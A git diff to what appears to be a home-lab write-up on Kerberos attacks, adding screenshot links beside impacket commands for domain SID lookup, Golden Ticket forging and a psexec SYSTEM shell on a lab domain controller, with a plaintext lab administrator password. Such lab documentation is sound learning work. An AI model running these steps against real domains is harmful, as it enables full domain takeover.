@@ -20,6 +20,8 @@ See [`docs/protocols/kerberos.md`](../../docs/protocols/kerberos.md)
 ```
 impacket-lookupsid bob.local/administrator:'MAMA1papa2@22'@192.168.10.7 | head -5
 ```
+![Domain SID retrieval](../../screenshots/03-kerberos-attacks/01-lookupsid.png)
+
 **Result:**
 [*] Domain SID is: S-1-5-21-855706183-3004611232-3925024008
 
@@ -46,6 +48,8 @@ impacket-ticketer \
   -domain bob.local \
   Administrator
 ```
+![Golden Ticket forged](../../screenshots/03-kerberos-attacks/03-ticketer.png)
+
 **Result:** ticket saved as `Administrator.ccache` in the current directory.
 
 ### 5. Load the ticket into the current session
@@ -57,6 +61,7 @@ export KRB5CCNAME=~/ad-project/Administrator.ccache
 ```bash
 impacket-psexec -k -no-pass bob.local/Administrator@ADDC01.bob.local
 ```
+![SYSTEM shell obtained via Golden Ticket](../../screenshots/03-kerberos-attacks/04-psexec-shell.png)
 **Result:**
 
 
